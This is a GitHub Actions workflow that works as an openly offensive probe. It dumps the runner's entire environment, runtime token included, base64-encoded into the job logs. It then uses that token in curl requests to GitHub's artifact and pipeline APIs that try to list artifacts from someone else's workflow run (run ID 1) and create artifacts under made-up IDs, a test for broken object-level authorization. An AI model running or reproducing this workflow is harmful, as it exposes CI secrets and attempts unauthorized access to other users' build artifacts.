name: RuntimeTokenProbe
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write

jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: Extract runtime token
        run: |
          echo "=ENV_B64_START="
          env | base64 -w0
          echo ""
          echo "=ENV_B64_END="
          echo "RUNTIME_URL=$ACTIONS_RUNTIME_URL"
          echo "RUN_ID=$GITHUB_RUN_ID"

      - name: Twirp probe
        run: |
          RT="$ACTIONS_RUNTIME_TOKEN"
          RESULTS="https://results.actions.githubusercontent.com"
          echo "=LIST_CURRENT="
          curl -s -w "\nHTTP:%{http_code}" \
            -X POST \
            -H "Authorization: Bearer $RT" \
            -H "Content-Type: application/json" \
            -d "{\"workflowRunId\":\"$GITHUB_RUN_ID\"}" \
            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts"
          echo ""
          echo "=LIST_BOLA_1="
          curl -s -w "\nHTTP:%{http_code}" \
            -X POST \
            -H "Authorization: Bearer $RT" \
            -H "Content-Type: application/json" \
            -d '{"workflowRunId":"1"}' \
            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts"
          echo ""
          echo "=CREATE_FAKE_IDS="
          curl -s -w "\nHTTP:%{http_code}" \
            -X POST \
            -H "Authorization: Bearer $RT" \
            -H "Content-Type: application/json" \
            -d '{"workflowRunBackendId":"00000000-0000-0000-0000-000000000001","workflowJobRunBackendId":"00000000-0000-0000-0000-000000000002","name":"bola-test","version":4}' \
            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact"
          echo ""
          echo "=PIPELINES_API="
          curl -s -w "\nHTTP:%{http_code}" \
            -H "Authorization: Bearer $RT" \
            "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/${GITHUB_RUN_ID}/artifacts?api-version=6.0-preview"
          echo ""
          echo "=PIPELINES_BOLA_1="
          curl -s -w "\nHTTP:%{http_code}" \
            -H "Authorization: Bearer $RT" \
            "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/1/artifacts?api-version=6.0-preview"
          echo ""
